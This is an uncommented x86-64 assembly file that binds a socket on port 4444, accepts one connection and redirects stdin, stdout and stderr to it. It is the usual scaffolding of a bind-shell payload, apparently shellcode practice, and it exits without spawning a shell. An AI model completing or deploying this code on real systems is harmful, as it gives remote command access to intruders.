BITS 64

section .data
sin_family dw 2
sin_port dw 0x5c11
sin_addr dd 0
sin_zero dq 0



section .bss
result_socket resd 1
result_socket_conn_accept resd 1 

section .text

global _start
_start:

mov rax, 0x29
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall

mov [result_socket], rax

mov rax, 0x31
mov rdi, [result_socket]
mov rsi, sin_family
mov rdx, 16
syscall

mov rax, 0x32
mov rdi, [result_socket]
mov rsi, 5
syscall

mov rax, 0x2b
mov rdi, [result_socket]
mov rsi, 0
mov rdx, 0
syscall

mov [result_socket_conn_accept], rax

mov rax, 0x21
mov rdi, [result_socket_conn_accept]
mov rsi, 0
syscall

mov rax, 0x21
mov rdi, [result_socket_conn_accept]
mov rsi, 1
syscall

mov rax, 0x21
mov rdi, [result_socket_conn_accept]
mov rsi, 2
syscall


mov rax,60
mov rdi,0
syscall
